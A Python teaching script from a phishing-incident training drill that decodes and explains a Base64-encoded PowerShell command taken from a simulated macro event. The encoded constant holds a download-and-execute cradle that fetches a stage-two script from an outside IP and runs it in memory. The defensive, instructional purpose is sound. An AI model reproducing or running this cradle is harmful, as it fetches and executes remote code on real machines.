#!/usr/bin/env python3
"""
decode_ps.py - Decode and display the Base64-encoded PowerShell command
               from the phishing incident scenario.

Usage: docker exec drill01-loader python3 /tools/decode_ps.py

This script decodes the PowerShell -Enc argument found in the macro execution
event on WS-KBAKER, allowing students to see what the macro actually executed.
"""

import base64

# The encoded PowerShell command from the macro execution event (Sysmon EventID 1)
# CommandLine: powershell.exe -W Hidden -NonI -NoP -Enc <this_value>
ENCODED_PAYLOAD = (
    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
    "LgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQAxAC4AMgAwADAA"
    "LgAxADIALgA0ADcALwBwAGEAeQBsAG8AYQBkAC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkA"
)


def decode_powershell_base64(encoded: str) -> str:
    """Decode a PowerShell Base64-encoded command string (UTF-16LE encoding)."""
    # PowerShell uses UTF-16 Little Endian for -EncodedCommand
    decoded_bytes = base64.b64decode(encoded)
    return decoded_bytes.decode("utf-16-le")


def main():
    print("=" * 60)
    print("Drill 01 - Phishing Incident: PowerShell Payload Decoder")
    print("=" * 60)
    print()
    print("Encoded payload (from Sysmon EventID 1 on WS-KBAKER):")
    print(f"  {ENCODED_PAYLOAD[:60]}...")
    print()

    decoded = decode_powershell_base64(ENCODED_PAYLOAD)

    print("Decoded PowerShell command:")
    print("-" * 60)
    print(decoded)
    print("-" * 60)
    print()
    print("Analysis:")
    print("  - IEX = Invoke-Expression: executes a string as PowerShell code")
    print("  - New-Object Net.WebClient: creates an HTTP client object")
    print("  - .DownloadString(): downloads content as a string (in memory)")
    print("  - The URL points to the C2 server for stage 2 payload")
    print()
    print("ATT&CK Technique: T1059.001 - Command and Scripting Interpreter: PowerShell")
    print("ATT&CK Technique: T1105  - Ingress Tool Transfer")
    print()
    print("Key Finding:")
    print("  The macro downloaded and executed a second-stage payload directly")
    print("  in memory (fileless execution). No file was written to disk before")
    print("  execution — this bypasses many file-based AV detections.")
    print()
    print("Next steps:")
    print("  1. Block C2 IP at firewall")
    print("  2. Search for other hosts connecting to same C2")
    print("  3. Check what stage2.ps1 does (may require network capture)")


if __name__ == "__main__":
    main()
